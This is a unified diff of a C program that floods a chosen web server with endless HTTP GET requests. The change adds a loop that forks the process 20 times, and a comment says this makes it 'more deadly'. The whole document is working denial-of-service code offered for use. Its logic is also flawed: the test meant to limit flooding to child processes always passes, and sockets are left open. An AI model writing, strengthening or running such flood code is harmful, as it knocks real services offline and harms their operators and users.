@@ -10,6 +10,7 @@
 #include <sys/time.h>
 #include <errno.h>
 #define RCVBUFSIZE 100000 /* Size of receive buffer */
+#define PROCESSCOUNT 20 /* How many times to fork the process */
 int errno;
 void DieWithError(char *errorMessage); /* Error handling function */ 
 
@@ -53,62 +54,81 @@ int main(int argc, char* argv[])
     }
 
     //Flood with HTTP GET requests, FOREVER!!!
-    for(;;)
-    {
-        //call getaddrinfo()
-        int status;
-        struct addrinfo hints;
-        struct addrinfo *servinfo;
+    /* More deadly if we spawn this process a lot of times using fork()! */
+    printf("Spawning the process %d times!\n", PROCESSCOUNT);
 
-        memset(&hints, 0, sizeof(hints));
-        hints.ai_family = AF_INET;
-        hints.ai_socktype = SOCK_STREAM;
+	for (int i = 0; i < PROCESSCOUNT; i++) {
+		pid_t pid = fork();
 
-        if((status = getaddrinfo(url, port, &hints, &servinfo)) != 0)
-        {
-            DieWithError("getaddrinfo() failed\n");
-            exit(1);
-        }
+		if (pid < 0) {
+			perror("fork() failed");
+			exit(1);
+		} else if (pid == 0) {
+			// Child process: break out of loop and continue HTTP logic
+			break;
+		} else {
+			// Parent process
+			// waitpid(pid, NULL, 0); // wait for each child
+		}
+	}
+    
+    if (getppid() != getpid()) { // Make sure the request loop is only run by children
+		for(;;) {
+			//call getaddrinfo()
+			int status;
+			struct addrinfo hints;
+			struct addrinfo *servinfo;
 
-        //call socket()
-        int sockfd;
-        if((sockfd = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol)) < 0)
-        {
-            DieWithError("socket() failed\n");
-            close(sockfd);
-            exit(1);
-        }
+			memset(&hints, 0, sizeof(hints));
+			hints.ai_family = AF_INET;
+			hints.ai_socktype = SOCK_STREAM;
 
-        //before calling connect(), get time of day
-        struct timeval t0;
-        gettimeofday(&t0, NULL);
+			if((status = getaddrinfo(url, port, &hints, &servinfo)) != 0)
+			{
+				DieWithError("getaddrinfo() failed\n");
+				exit(1);
+			}
 
-        //call connect()
-        int connect_status;
-        if((connect_status = connect(sockfd, servinfo->ai_addr, servinfo->ai_addrlen)) < 0)
-        {
-            DieWithError("connect() failed");
-            close(sockfd);
-            exit(1);
-        }
-        freeaddrinfo(servinfo);
+			//call socket()
+			int sockfd;
+			if((sockfd = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol)) < 0)
+			{
+				DieWithError("socket() failed\n");
+				close(sockfd);
+				exit(1);
+			}
 
-        //write a HTTP message
-        char request[strlen(url) + strlen(filepath) + 40];
-        sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", filepath, url);
-        printf("-----------------HTTP REQUEST SENT-----------------\n");
-        printf("%s", request);
+			//before calling connect(), get time of day
+			struct timeval t0;
+			gettimeofday(&t0, NULL);
 
-        //flood server with HTTP messages
-        int len, bytes_sent;
-        len = strlen(request);
-        if((bytes_sent = send(sockfd, request, len, 0)) < 0)
-        {
-            DieWithError("send() failed");
-            close(sockfd);
-            exit(1);
-        }
-    }
+			//call connect()
+			int connect_status;
+			if((connect_status = connect(sockfd, servinfo->ai_addr, servinfo->ai_addrlen)) < 0)
+			{
+				DieWithError("connect() failed");
+				close(sockfd);
+				exit(1);
+			}
+			freeaddrinfo(servinfo);
+
+			//write a HTTP message
+			char request[strlen(url) + strlen(filepath) + 40];
+			sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", filepath, url);
+			printf("-----------------HTTP REQUEST SENT-----------------\n");
+			printf("%s", request);
+
+			//flood server with HTTP messages
+			int len, bytes_sent;
+			len = strlen(request);
+			if((bytes_sent = send(sockfd, request, len, 0)) < 0)
+			{
+				DieWithError("send() failed");
+				close(sockfd);
+				exit(1);
+			}
+		}
+	}
 
     return 0;
 }
